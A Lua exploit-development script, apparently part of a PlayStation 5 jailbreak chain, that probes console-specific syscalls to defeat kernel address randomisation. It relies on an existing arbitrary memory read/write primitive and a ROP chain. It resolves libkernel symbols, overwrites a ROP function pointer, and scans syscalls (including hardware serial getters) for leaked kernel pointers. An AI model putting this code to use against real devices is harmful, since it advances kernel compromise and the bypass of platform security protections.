-- CRASH_CLASS: MODERATE (probing unknown syscalls)
-- PROBE 42f: PS5-specific syscalls for KASLR defeat
--
-- Try PS5 custom syscalls that might leak kernel addresses:
--   594: sceKernelDlsym (resolve symbol from module)
--   598: sceKernelGetModuleList (alt module list)
--   596/597: event flags
--   600: sceKernelGetAppInfo or similar
--   Various info syscalls in 600-650 range

print("=== PROBE 42f: PS5 SYSCALL SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

--------------------------------------------------------------------
-- A) sceKernelDlsym (594) — resolve symbol from a module
-- signature: dlsym(handle, symbol_name, &addr_out)
--------------------------------------------------------------------
print("")
print("=== A: DLSYM (594) ===")
do
    local sc_dlsym = make_syscall(594)
    local sym_name = memory.alloc(64)
    local addr_out = memory.alloc(8)

    -- Try resolving symbols from libkernel (handle 8193 or 0x2001)
    -- and from handle 0 (default/global)
    local symbols = {
        "sceKernelGetCurrentCpu",
        "sceKernelGetProcessTime",
        "sceKernelGetDirectMemorySize",
        "sceKernelMapDirectMemory",
        "sceKernelSendNotificationRequest",
        "sceKernelDebugOutText",
        "__error",
        "sceKernelGetProcParam",
    }

    local handles = {0x2001, 0}
    for _, handle in ipairs(handles) do
        local label = handle == 0x2001 and "libkernel" or "global"
        for _, sym in ipairs(symbols) do
            for i = 1, #sym do memory.write_byte(sym_name+(i-1), string.byte(sym, i)) end
            memory.write_byte(sym_name + #sym, 0)
            safe_wq(addr_out, uint64(0))

            local ok, ret = pcall(function()
                return sc_dlsym(uint64(handle), uint64(sym_name), uint64(addr_out))
            end)
            local rv = ok and to_num(ret) or -999
            if rv == 0 then
                local addr = safe_rq(addr_out)
                if addr then
                    local h, l = get_hi_lo(addr)
                    local tag = ""
                    if h >= 0xFFFF8000 then
                        tag = " *** KERNEL ***"
                        kptrs[#kptrs+1] = {src="dlsym:"..sym, off=0, h=h, l=l}
                    end
                    print(string.format("  [%s] %s = %08X_%08X%s", label, sym, h, l, tag))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- B) Call resolved functions via ropchain to get kernel info
-- Use the existing ropchain to call functions we resolved
--------------------------------------------------------------------
print("")
print("=== B: CALL RESOLVED FUNCS ===")
do
    -- First get the ropchain addresses
    local pipe_str = tostring(syscall.pipe)
    local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")

    if fn_addr_str then
        print("fn_addr ptr: " .. fn_addr_str)

        -- Allocate GPU mmap to reach ropchain
        local sc_mmap = make_syscall(477)
        local sc_munmap = make_syscall(588)
        local gpu_size = 512 * 0x4000
        local gpu_addr
        pcall(function()
            gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

        if gpu_addr then
            local fn_ptr = uint64(fn_addr_str)
            local fn_orig = safe_rq(fn_ptr)
            if fn_orig then
                print("fn_addr original: " .. string.format("%08X_%08X", get_hi_lo(fn_orig)))

                -- Now resolve sceKernelGetCurrentCpu from libkernel
                local sc_dlsym = make_syscall(594)
                local sym_name = memory.alloc(64)
                local addr_out = memory.alloc(8)

                -- Try to get sceKernelGetCurrentCpu address
                local target_sym = "sceKernelGetCurrentCpu"
                for i = 1, #target_sym do memory.write_byte(sym_name+(i-1), string.byte(target_sym, i)) end
                memory.write_byte(sym_name + #target_sym, 0)
                safe_wq(addr_out, uint64(0))

                local ok_d, dret = pcall(function()
                    return sc_dlsym(uint64(0x2001), uint64(sym_name), uint64(addr_out))
                end)
                local drv = ok_d and to_num(dret) or -999

                if drv == 0 then
                    local target_addr = safe_rq(addr_out)
                    if target_addr then
                        local th, tl = get_hi_lo(target_addr)
                        print(string.format("  target func: %08X_%08X", th, tl))

                        -- Redirect fn_addr to call this function
                        -- The ropchain calls fn_addr with rdi as first arg
                        -- sceKernelGetCurrentCpu() takes no args, returns int
                        safe_wq(fn_ptr, target_addr)

                        -- Now call any syscall — the ropchain will call our target
                        -- But wait: the ropchain is designed for syscalls
                        -- We need to be careful: the ret value from the call
                        -- goes through the chain's restore logic

                        -- Actually, let's NOT redirect yet — just verify we can
                        -- Instead, let's see what the ORIGINAL fn_addr points to
                        -- by reading the instruction bytes there
                        print("  reading fn_addr target bytes:")
                        for off = 0, 0x30, 8 do
                            local q = safe_rq(fn_orig + off)
                            if q then
                                local qh, ql = get_hi_lo(q)
                                print(string.format("    +%02X: %08X_%08X", off, qh, ql))
                            end
                        end

                        -- Restore fn_addr
                        safe_wq(fn_ptr, fn_orig)
                    end
                end
            end
            pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
        end
    end
end

--------------------------------------------------------------------
-- C) PS5 syscall scan — try ranges that might return kernel info
--------------------------------------------------------------------
print("")
print("=== C: SYSCALL SCAN ===")
do
    local out_buf = memory.alloc(0x100)
    local safe_syscalls = {
        {num=576, name="sceKernelGetDirectMemorySize"},
        {num=580, name="sceKernelAvailableDirectMemorySize"},
        {num=581, name="sceKernelGetPageTableStats"},
        {num=585, name="sceKernelMtypeprotect"},
        {num=586, name="sceKernelDirectMemoryQuery"},
        {num=598, name="sceKernelGetModuleList2"},
        {num=602, name="sceKernelGetModuleInfoEx"},
        {num=608, name="sceKernelGetSystemSwVersion"},
        {num=610, name="sceKernelGetOpenPsIdForSystem"},
        {num=616, name="sceKernelGetCpumode"},
        {num=617, name="sceKernelGetCpuUsage"},
        {num=619, name="sceKernelGetTscFrequency"},
        {num=621, name="sceKernelIsNeoMode"},
        {num=624, name="sceKernelGetHwModelName"},
        {num=625, name="sceKernelGetHwSerialNumber"},
    }

    for _, sc in ipairs(safe_syscalls) do
        for i = 0, 0xF, 4 do safe_wd(out_buf+i, 0) end
        local s = make_syscall(sc.num)

        -- Try calling with an output buffer arg
        local ok, ret = pcall(function()
            return s(uint64(out_buf))
        end)
        local rv = ok and to_num(ret) or -999

        if rv >= 0 and rv ~= 0xFFFFFFFF then
            -- Check if return value itself is a kernel pointer
            if ok and ret then
                local rh, rl = get_hi_lo(ret)
                if rh >= 0xFFFF8000 then
                    print(string.format("  %d %s: ret KPTR %08X_%08X!", sc.num, sc.name, rh, rl))
                    kptrs[#kptrs+1] = {src="sc"..sc.num, off=0, h=rh, l=rl}
                else
                    -- Check output buffer
                    local q = safe_rq(out_buf)
                    local qh, ql = 0, 0
                    if q then qh, ql = get_hi_lo(q) end
                    local tag = ""
                    if qh >= 0xFFFF8000 then
                        tag = " KPTR!"
                        kptrs[#kptrs+1] = {src="sc"..sc.num, off=0, h=qh, l=ql}
                    end
                    print(string.format("  %d %s: ret=%d buf=%08X_%08X%s",
                        sc.num, sc.name, rv, qh, ql, tag))
                end
            end
        else
            -- Only print first few failures
            if sc.num <= 590 or sc.num >= 615 then
                print(string.format("  %d %s: ret=%d", sc.num, sc.name, rv))
            end
        end
    end
end

--------------------------------------------------------------------
-- D) Try sceKernelDirectMemoryQuery (586) more carefully
-- This queries physical memory regions and might return kernel info
--------------------------------------------------------------------
print("")
print("=== D: DIRECT MEMORY QUERY ===")
do
    local sc_dmq = make_syscall(586)
    -- signature: sceKernelDirectMemoryQuery(off_t start, int flags,
    --            SceKernelDirectMemoryQueryInfo *info, size_t infoSize)
    -- info struct: { off_t start, off_t end, int memoryType }
    local info = memory.alloc(64)

    local offsets = {0, 0x100000, 0x1000000, 0x10000000, 0x100000000}
    for _, start_off in ipairs(offsets) do
        for i = 0, 48, 4 do safe_wd(info+i, 0) end

        local ok, ret = pcall(function()
            return sc_dmq(uint64(start_off), uint64(0), uint64(info), uint64(48))
        end)
        local rv = ok and to_num(ret) or -999
        if rv == 0 then
            local s_q = safe_rq(info)
            local e_q = safe_rq(info + 8)
            local t_v = safe_rd(info + 16)
            local sh, sl = 0, 0
            local eh, el = 0, 0
            if s_q then sh, sl = get_hi_lo(s_q) end
            if e_q then eh, el = get_hi_lo(e_q) end
            print(string.format("  query 0x%X: start=%08X_%08X end=%08X_%08X type=%d",
                start_off, sh, sl, eh, el, t_v or -1))

            -- Check for kernel addresses
            if sh >= 0xFFFF8000 then
                kptrs[#kptrs+1] = {src="dmq_start", off=start_off, h=sh, l=sl}
            end
            if eh >= 0xFFFF8000 then
                kptrs[#kptrs+1] = {src="dmq_end", off=start_off, h=eh, l=el}
            end
        else
            print(string.format("  query 0x%X: ret=%d", start_off, rv))
        end
    end
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== SUMMARY ===")
print("kernel pointers found: " .. #kptrs)
for _, kp in ipairs(kptrs) do
    print(string.format("  [%s] %08X_%08X", kp.src, kp.h, kp.l))
end

print("")
print("=== PROBE 42f COMPLETE ===")
